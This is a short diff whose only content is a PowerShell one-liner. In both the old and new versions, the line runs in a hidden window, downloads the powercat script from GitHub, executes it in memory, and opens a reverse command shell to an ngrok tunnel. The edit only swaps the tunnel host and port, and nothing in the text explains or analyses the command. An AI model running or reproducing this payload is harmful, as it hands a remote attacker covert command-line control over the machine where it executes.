@@ -1,1 +1,1 @@
-powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 0.tcp.eu.ngrok.io -p 17346 -e cmd"
+powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 4.tcp.eu.ngrok.io -p 15607 -e cmd"
